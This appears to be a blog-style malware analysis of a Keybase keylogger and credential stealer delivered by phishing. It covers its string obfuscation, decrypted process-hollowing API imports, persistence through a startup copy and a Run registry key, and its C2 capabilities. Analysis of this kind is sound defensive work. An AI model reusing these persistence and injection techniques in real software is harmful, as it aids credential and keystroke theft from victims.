Keybase Logger/Clipboard/CredsStealer campaign

While checking my email another day i came across a phish email that seemed quite suspicious. see below:

1/6

It came with compressed file named Product_details.gz. when extracted; it presented a file
named Payment_45476.scr. This file is windows executable which was .net compiled, The file was then opened with a
tool called ILSPY in order to analyze its inner workings.
- Looking at its main function it seems it created two threads:

The function below looks to be using a primitive form of obfuscation that consist on reversing strings.

Looking at the function below; the malware uses an Encryption class that handles the decryption of several strings
found throughout the code see below.

2/6

Looking at the function below, it seems it invokes the DecryptText function declared on the Encryption class.

3/6

The decoded data corresponds the imports the malware will be using:
CreateProcessA
GetThreadContext
SetThreadContext
Wow64SetThreadContext
ReadProcessMemory
WriteProcessMemory
NtUnmapViewOfSection
VirtualAllocEx
ResumeThread
When this sample was executed it was clear the sample had malicious intents.It established persistence by copying
itself to the startup folder and setting the autorun registry key at startup. The malware names itself "Important.exe"
which on looking at the code it seems a static value set by the author. see below for registry and file activity.
[CreateFile] Payment_45476.exe:1316 > %AllUsersProfile%\Important.exe
[MD5:
7c6a2697df26582b438c21ee7ce5b0b1]
[RegSetValue] Payment_45476.exe:1316 >
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\50057d8e6fa9271dc2110b90bda7f871 =
C:\ProgramData\Important.exe

The malware then starts to reach out to its c2. The requests indicate the malware has the following capabilities:
Takes a screenshot of the current working window
Acts as a keylogger and credential stealer.
Captures clipboard content.

On looking further to the c2 callbacks, it was noticed the locations in which the screenshots were shared was world
readable. See sample below:

4/6

The login panel was also available :

In conclusion ,this malware is considered primitive based on its design. however, it can certainly cause damage its
kelogging, screen sharing and credential stealing capabilities make it very attractive to skiddies. thank you for reading
